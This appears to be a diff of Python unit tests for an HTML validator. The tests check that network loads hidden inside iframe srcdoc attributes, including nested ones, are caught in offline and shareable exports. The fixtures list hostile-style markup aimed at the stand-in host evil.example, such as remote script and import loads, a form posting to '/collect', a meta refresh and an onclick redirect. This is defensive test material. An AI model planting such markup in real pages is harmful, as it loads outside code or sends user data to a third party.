@@ -1,4 +1,5 @@
 from _validate_helpers import *
+from checks import resources  # noqa: E402  the shared srcdoc depth bound
 
 
 class NewCheckTests(unittest.TestCase):
@@ -1094,6 +1095,104 @@ class NewCheckTests(unittest.TestCase):
                 errors, warnings = self._errs_warns(doc)
                 self.assertEqual(errors, [], (base, errors))
                 self.assertEqual(warnings, [], (base, warnings))
+
+    # -- iframe srcdoc: a nested document carried as an attribute VALUE ---- #
+    #
+    # Every lookup this gate makes reads ELEMENTS and ATTRIBUTES off a tag index built from the
+    # document's own markup, so a whole document parked in an `<iframe srcdoc>` was invisible to
+    # all of them: its `<img src>`, its `<script src>`, its `<base href>`, its inline egress and
+    # its `on*` handlers rode into an offline export untouched and `--strict` certified the file
+    # as offline-clean (#991). The offline strip now sanitizes a srcdoc through its own full
+    # strip, so this gate has to read the same markup or the two disagree.
+    @staticmethod
+    def _srcdoc(markup):
+        value = (markup.replace("&", "&amp;").replace('"', "&quot;")
+                 .replace("<", "&lt;").replace(">", "&gt;"))
+        return '<iframe title="nested" srcdoc="%s"></iframe>' % value
+
+    # Each case is markup this gate ALREADY rejects when it is written in the document directly, so
+    # a failure here is precisely "the nesting hid it", not "the rule does not exist".
+    _SRCDOC_EGRESS_CASES = (
+        '<img src="https://evil.example/x.png" alt="x">',
+        '<script src="https://evil.example/x.js"></script>',
+        # An SVG script loads through `href`/`xlink:href` and carries no body at all.
+        '<svg><script href="https://evil.example/x.js"></script></svg>',
+        '<base href="https:evil.example/">',
+        '<iframe title="deep" src="https://evil.example/f.html"></iframe>',
+        '<video poster="https://evil.example/p.png"></video>',
+        '<form action="https://evil.example/collect"><button>go</button></form>',
+        '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
+        '<button onclick="location.href=\'https://evil.example/x\'">go</button>',
+        '<script>import("https://evil.example/x.js")</script>',
+        '<style>@import "https://evil.example/t.css";</style>',
+        '<p style="background:url(https://evil.example/x.png)">x</p>',
+    )
+
+    def test_offline_mode_rejects_network_loads_inside_an_iframe_srcdoc(self):
+        for markup in self._SRCDOC_EGRESS_CASES:
+            with self.subTest(markup=markup):
+                doc = with_offline_mode(build(body=self._body(MAIN, self._srcdoc(markup))))
+                errors, _ = self._errs_warns(doc)
+                self.assertTrue(
+                    any(e.startswith("inside an <iframe srcdoc>: ") for e in errors),
+                    (markup, errors))
+
+    # A srcdoc document can carry its own srcdoc, so the walk recurses - and the finding is marked
+    # once per level, so an author can tell how deep the reference they must edit is buried.
+    def test_offline_mode_rejects_a_network_load_nested_two_srcdocs_deep(self):
+        inner = self._srcdoc('<img src="https://evil.example/x.png" alt="x">')
+        doc = with_offline_mode(build(body=self._body(MAIN, self._srcdoc(inner))))
+        errors, _ = self._errs_warns(doc)
+        self.assertTrue(
+            any(e.startswith("inside an <iframe srcdoc>: inside an <iframe srcdoc>: ")
+                and "evil.example" in e for e in errors), errors)
+
+    # The self-contained guarantee is not offline-only, and unlike an offline file a shareable one
+    # has no zero-network CSP behind it at all.
+    def test_shareable_mode_rejects_a_network_load_inside_an_iframe_srcdoc(self):
+        doc = build(body=self._body(MAIN, self._srcdoc(
+            '<img src="https://evil.example/x.png" alt="x">')))
+        errors, _ = self._errs_warns(doc)
+        self.assertTrue(any("self-contained guarantee" in e or "loads over the network" in e
+                            for e in errors if e.startswith("inside an <iframe srcdoc>: ")),
+                        errors)
+
+    # The control this whole rule rests on: a srcdoc that loads nothing is content, and content is
+    # kept. A nested document declares no layer descriptor and no CSP of its own, so neither may be
+    # demanded of it either.
+    def test_offline_mode_accepts_an_iframe_srcdoc_that_loads_nothing(self):
+        for markup in ('<p>a nested note</p>',
+                       '<img src="data:image/png;base64,AAAA" alt="x">',
+                       '<base href="assets/">',
+                       '<style>p { color: #123456; }</style>',
+                       '<script type="application/json">{"k": 1}</script>'):
+            with self.subTest(markup=markup):
+                doc = with_offline_mode(build(body=self._body(MAIN, self._srcdoc(markup))))
+                errors, warnings = self._errs_warns(doc)
+                self.assertEqual(errors, [], (markup, errors))
+                self.assertEqual(warnings, [], (markup, warnings))
+
+    # Past the shared bound neither side reads anything, so the gate REFUSES rather than certifies
+    # markup it did not analyze - which is also what the export does, by removing the attribute.
+    def test_a_srcdoc_nested_past_the_shared_bound_is_refused(self):
+        markup = '<img src="https://evil.example/x.png" alt="x">'
+        for _ in range(resources.OFFLINE_SRCDOC_MAX_DEPTH + 1):
+            markup = self._srcdoc(markup)
+        doc = with_offline_mode(build(body=self._body(MAIN, markup)))
+        errors, _ = self._errs_warns(doc)
+        self.assertTrue(any("nested more than %d deep" % resources.OFFLINE_SRCDOC_MAX_DEPTH in e
+                            for e in errors), errors)
+
+    # ...and exactly AT the bound it is still read, so the refusal is a bound rather than an
+    # off-by-one that quietly stops looking a level early.
+    def test_a_srcdoc_nested_to_the_shared_bound_is_still_read(self):
+        markup = '<img src="https://evil.example/x.png" alt="x">'
+        for _ in range(resources.OFFLINE_SRCDOC_MAX_DEPTH):
+            markup = self._srcdoc(markup)
+        doc = with_offline_mode(build(body=self._body(MAIN, markup)))
+        errors, _ = self._errs_warns(doc)
+        self.assertTrue(any("evil.example" in e for e in errors), errors)
+        self.assertFalse(any("nested more than" in e for e in errors), errors)
 
 
     def test_external_stylesheet_link_warns(self):
